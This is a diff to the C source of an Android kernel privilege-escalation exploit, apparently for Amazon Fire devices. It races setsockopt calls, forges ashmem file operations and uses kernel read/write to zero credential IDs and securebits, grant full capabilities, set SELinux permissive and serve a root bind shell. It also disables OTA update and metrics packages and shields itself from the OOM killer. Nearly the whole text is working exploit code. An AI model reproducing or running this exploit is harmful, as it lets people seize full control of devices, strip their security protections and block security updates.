@@ -143,10 +143,8 @@ static void stamp_stack(void) {
     atomic_store(&consumer_go, 1);
     while (!atomic_load(&consumer_launch))
         __asm__ volatile("yield" ::: "memory");
-    for (unsigned long calls = 0; calls < 10000000ul && !atomic_load(&consumer_done); calls++)
-        setsockopt(stamp_sock, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, buf, sizeof(buf));
     for (;;)
-        __asm__ volatile("yield" ::: "memory");
+        setsockopt(stamp_sock, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, buf, sizeof(buf));
 }
 
 static void *waiter_fn(void *unused) {
@@ -447,7 +445,7 @@ static void set_root_env(void) {
     setenv("USER", "root", 1);
     setenv("LOGNAME", "root", 1);
     setenv("SHELL", "/system/bin/sh", 1);
-    setenv("PS1", "sheldon:${PWD} # ", 1);
+    setenv("PS1", "kara:${PWD} # ", 1);
 }
 
 static void serve_shell(int client, const int *fds, int nfds, const char *cwd) {
@@ -686,6 +684,8 @@ static void bind_shell_server(void) {
     }
 }
 
+#define GL_FOPS_ERASE_MARKER_OFF 0x04u
+
 #include "gl_reclaim.h"
 
 static void blob_u32(uint8_t *blob, unsigned object_off, uint32_t value) {
@@ -724,10 +724,8 @@ static int set_ashmem_blob(int fd, const uint8_t *blob, size_t len) {
 }
 
 static void forge_unlocked_mutex(uint8_t *blob) {
-
     unsigned m = g_profile.configfs_mutex_off;
     memset(blob + m - ASHMEM_NAME_PREFIX_LEN, 0, 0x18);
-    blob_u32(blob, m, 1);
 }
 
 static uint32_t g_krw_pos;
@@ -786,8 +784,13 @@ static ssize_t kernel_read_once(int fd, uint32_t target, void *data, size_t len)
 }
 
 static int kernel_zero_credential_ids(int fd, uint32_t cred) {
-    uint8_t zeros[0x20] = {0};
+    uint8_t zeros[0x1e] = {0};
     return kernel_write_once(fd, cred + 0x05, zeros, sizeof(zeros)) == (ssize_t)sizeof(zeros);
+}
+
+static int kernel_clear_securebits(int fd, uint32_t cred) {
+    uint8_t zeros[2] = {0};
+    return kernel_write_once(fd, cred + 0x25, zeros, sizeof(zeros)) == (ssize_t)sizeof(zeros);
 }
 
 static int kernel_read_u32(int fd, uint32_t target, uint32_t *value);
@@ -837,20 +840,17 @@ static int kernel_grant_full_caps(int fd, uint32_t cred) {
 static int kernel_read_u32(int fd, uint32_t target, uint32_t *value);
 static int kernel_ptr(uint32_t p);
 
-#define SELINUX_STATUS_PAGE 0xc100c3e8u
-#define GL_MEM_MAP 0xc1001ac4u
-#define GL_PFN_OFFSET 0xc0f0bb44u
-#define GL_VA_SUB 0x81000000u
 #define GL_STATUS_BIAS 0x1000000u
 #define GL_STATUS_SCAN_PAGES 8192
 
 static int gl_status_page_va(int fd, uint32_t *out) {
     uint32_t page = 0, mem_map = 0, pfnoff = 0;
-    if (!kernel_read_u32(fd, SELINUX_STATUS_PAGE, &page) || !kernel_ptr(page) ||
-        !kernel_read_u32(fd, GL_MEM_MAP, &mem_map) || !kernel_ptr(mem_map) ||
-        !kernel_read_u32(fd, GL_PFN_OFFSET, &pfnoff))
+    if (!kernel_read_u32(fd, g_profile.selinux_status_page, &page) || !kernel_ptr(page) ||
+        !kernel_read_u32(fd, g_profile.mem_map, &mem_map) || !kernel_ptr(mem_map) ||
+        !kernel_read_u32(fd, g_profile.pfn_offset, &pfnoff))
         return 0;
-    *out = ((pfnoff + ((page - mem_map) >> 5)) << 12) - GL_VA_SUB;
+    *out = ((pfnoff + (page - mem_map) / g_profile.page_struct_size) << 12) -
+           g_profile.lowmem_va_sub;
     return 1;
 }
 
@@ -908,8 +908,8 @@ static int kernel_set_permissive(int fd, uint32_t task) {
         kernel_write_data(fd, kva + 4, &s2, 4);
     }
 
-    uint8_t z3[3] = {0};
-    kernel_write_once(fd, g_profile.selinux_enforcing + 1, z3, 3);
+    uint8_t zero_int[2] = {0};
+    kernel_write_once(fd, g_profile.selinux_enforcing + 1, zero_int, sizeof(zero_int));
     kernel_read_u32(fd, g_profile.selinux_enforcing, &after);
     dprintf(2, "[perm] enforcing %u->%u; status %s\n", before, after, ok ? "updated" : "not-updated");
     fsync(2);
@@ -945,6 +945,7 @@ static int validate_runtime_profile(int fd) {
 }
 
 static uint32_t find_current_task(int fd) {
+    const uint32_t lowmem_min = g_profile.kernel_image_base + g_profile.kernel_size;
     char self_comm[17] = {0};
     prctl(PR_GET_NAME, self_comm, 0, 0, 0);
     uint32_t link = 0;
@@ -957,10 +958,10 @@ static uint32_t find_current_task(int fd) {
     for (unsigned count = 0; count < 4096; count++) {
         if (link == INIT_TASK_TASKS)
             break;
-        if (link < 0xc1000000u || link >= 0xf0000000u || (link & 3u))
+        if (link < lowmem_min || link >= 0xf0000000u || (link & 3u))
             return 0;
         uint32_t task = link - TASK_TASKS_OFF;
-        if (task < 0xc1000000u || task >= 0xf0000000u)
+        if (task < lowmem_min || task >= 0xf0000000u)
             return 0;
         char comm[17] = {0};
         if (kernel_read_once(fd, task + TASK_COMM_OFF, comm, 16) != 16)
@@ -987,15 +988,15 @@ static int patch_current_credentials(int fd, uint32_t task) {
     dprintf(2, "[root] real_cred=%08x cred=%08x\n", real_cred, cred);
     fsync(2);
 
-    if (!kernel_zero_credential_ids(fd, cred))
+    if (!kernel_zero_credential_ids(fd, cred) || !kernel_clear_securebits(fd, cred))
         return 0;
-    uint32_t ids[8];
+    uint32_t ids[9];
     if (kernel_read_once(fd, cred + 0x04, ids, sizeof(ids)) != sizeof(ids))
         return 0;
-    for (unsigned i = 0; i < 8; i++)
+    for (unsigned i = 0; i < 9; i++)
         if (ids[i] != 0)
             return 0;
-    dprintf(2, "[root] credential UID/GID fields zeroed\n");
+    dprintf(2, "[root] credential UID/GID fields and securebits zeroed\n");
 
     if (kernel_grant_full_caps(fd, cred)) {
         uint32_t eff[2] = {0, 0};
@@ -1032,6 +1033,8 @@ static int validate_loaded_profile(char *error, size_t error_size) {
         g_profile.ashmem_open, g_profile.ashmem_release,
         g_profile.ashmem_ioctl, g_profile.ashmem_mmap,
         CONFIGFS_READ_FILE, CONFIGFS_WRITE_FILE,
+        g_profile.selinux_status_page, g_profile.mem_map,
+        g_profile.pfn_offset,
     };
     for (unsigned i = 0; i < sizeof(addresses) / sizeof(addresses[0]); i++)
         if (!kernel_ptr(addresses[i])) {
@@ -1040,7 +1043,13 @@ static int validate_loaded_profile(char *error, size_t error_size) {
             return 0;
         }
     const uint32_t offsets[] = {
-        TASK_TASKS_OFF, TASK_REAL_CRED_OFF, TASK_CRED_OFF, TASK_COMM_OFF,
+        TASK_TASKS_OFF,           TASK_REAL_CRED_OFF,
+        TASK_CRED_OFF,            TASK_COMM_OFF,
+        g_profile.task_prio_off,  g_profile.task_static_prio_off,
+        g_profile.task_normal_prio_off, g_profile.task_rt_priority_off,
+        g_profile.task_sched_class_off, g_profile.task_pi_lock_off,
+        g_profile.task_pi_waiters_off,  g_profile.task_pi_top_task_off,
+        g_profile.task_pi_blocked_on_off,
     };
     for (unsigned i = 0; i < sizeof(offsets) / sizeof(offsets[0]); i++)
         if (offsets[i] >= 0x2000u || (offsets[i] & 3u)) {
@@ -1066,6 +1075,18 @@ static int validate_loaded_profile(char *error, size_t error_size) {
         (g_profile.futex_hash_buckets & (g_profile.futex_hash_buckets - 1)) ||
         !g_profile.futex_hash_buckets || g_profile.futex_hash_buckets > KS_HASH_MAX) {
         snprintf(error, error_size, "profile contains invalid futex hash parameters");
+        return 0;
+    }
+    if (!(g_profile.task_pi_lock_off < g_profile.task_pi_waiters_off &&
+          g_profile.task_pi_waiters_off < g_profile.task_pi_top_task_off &&
+          g_profile.task_pi_top_task_off < g_profile.task_pi_blocked_on_off) ||
+        g_profile.task_pi_blocked_on_off + 4 >= RECLAIM_DATA - 0x400) {
+        snprintf(error, error_size, "profile contains inconsistent task PI offsets");
+        return 0;
+    }
+    if (g_profile.page_struct_size < 16u || g_profile.page_struct_size > 128u ||
+        (g_profile.page_struct_size & 3u) || (g_profile.lowmem_va_sub & 0xffffffu)) {
+        snprintf(error, error_size, "profile contains invalid lowmem layout parameters");
         return 0;
     }
     if (g_profile.stamp_socket_kind > 2 || g_profile.stamp_copy_depth < 0x40 ||
@@ -1213,15 +1234,26 @@ static void run_pm(const char *action, const char *pkg) {
         execl("/system/bin/pm", "pm", action, pkg, (char *)NULL);
         _exit(127);
     }
-    if (c > 0)
-        while (waitpid(c, NULL, 0) < 0 && errno == EINTR) {
+    if (c > 0) {
+        int st = 0;
+        while (waitpid(c, &st, 0) < 0 && errno == EINTR) {
         }
+        int ok = WIFEXITED(st) && WEXITSTATUS(st) == 0;
+        dprintf(2, "[ota] pm %s %s %s\n", action, pkg, ok ? "ok" : "not applied");
+    }
 }
 
 static void disable_ota(void) {
-    run_pm("disable-user", "com.amazon.device.software.ota");
-    run_pm("clear", "com.amazon.device.software.ota");
-    run_pm("disable-user", "com.amazon.device.software.ota.override");
+    static const char *const packages[][2] = {
+        {"disable-user", "com.amazon.device.software.ota"},
+        {"clear", "com.amazon.device.software.ota"},
+        {"disable", "com.amazon.device.software.ota.override"},
+        {"disable-user", "com.amazon.sneakpeek"},
+        {"disable", "com.amazon.client.metrics"},
+    };
+    for (unsigned i = 0; i < sizeof(packages) / sizeof(packages[0]); i++)
+        run_pm(packages[i][0], packages[i][1]);
+    sleep(3);
     pid_t s = fork();
     if (s == 0) {
         execl("/system/bin/sync", "sync", (char *)NULL);
@@ -1230,7 +1262,7 @@ static void disable_ota(void) {
     if (s > 0)
         while (waitpid(s, NULL, 0) < 0 && errno == EINTR) {
         }
-    dprintf(2, "[ota] update packages disabled\n");
+    dprintf(2, "[ota] done\n");
 }
 
 static const char *base_name(const char *path) {
@@ -1264,6 +1296,22 @@ static void run_root_script(const char *path) {
         dprintf(2, "[exec] %s exited status=%d\n", path, code);
         fsync(2);
     }
+}
+
+static void lower_oom_score(void) {
+    static const char *const paths[] = {"/proc/self/oom_score_adj", "/proc/self/oom_adj"};
+    for (unsigned i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
+        int fd = open(paths[i], O_WRONLY | O_CLOEXEC);
+        if (fd < 0)
+            continue;
+        ssize_t n = write(fd, "-1000", 5);
+        close(fd);
+        if (n == 5) {
+            dprintf(2, "[i] oom score lowered via %s\n", paths[i]);
+            return;
+        }
+    }
+    dprintf(2, "[!] could not lower oom score; continuing unprotected\n");
 }
 
 static void retry_or_hold(void) {
@@ -1355,6 +1403,8 @@ int main(int argc, char **argv) {
     dprintf(2, "[+] init_task=%08x ashmem_misc_fops=%08x original=%08x\n", INIT_TASK,
             ASHMEM_MISC_FOPS, ASHMEM_FOPS);
 
+    lower_oom_score();
+
     if (!prepare_stack_stamp()) {
         dprintf(2, "[-] failed to prepare stack stamper errno=%d\n", errno);
         return 2;
@@ -1386,7 +1436,7 @@ int main(int argc, char **argv) {
     dprintf(2, "[m] returned errno=%d (want 35)\n", errno);
     int hit = -1;
     while (!atomic_load(&consumer_done)) {
-        hit = find_fake_fops_word(g_profile.fops_read_off, CONFIGFS_READ_FILE);
+        hit = find_fake_fops_word(GL_FOPS_ERASE_MARKER_OFF, ASHMEM_MISC_FOPS);
         if (hit >= 0)
             break;
         usleep(1000);
@@ -1394,8 +1444,14 @@ int main(int argc, char **argv) {
     while (!atomic_load(&consumer_done))
         usleep(1000);
     if (hit < 0)
-        hit = find_fake_fops_word(g_profile.fops_read_off, CONFIGFS_READ_FILE);
+        hit = find_fake_fops_word(GL_FOPS_ERASE_MARKER_OFF, ASHMEM_MISC_FOPS);
     dprintf(2, "[write] reclaim socket=%d\n", hit);
+    if (hit < 0) {
+        dprintf(2, "[-] fops marker absent from every reclaim socket; holding reclaim\n");
+        fsync(2);
+        for (;;)
+            sleep(3600);
+    }
     dprintf(2, "[write] fops stage returned; opening /dev/ashmem\n");
     int afd = open("/dev/ashmem", O_RDWR | O_CLOEXEC);
     if (afd < 0) {
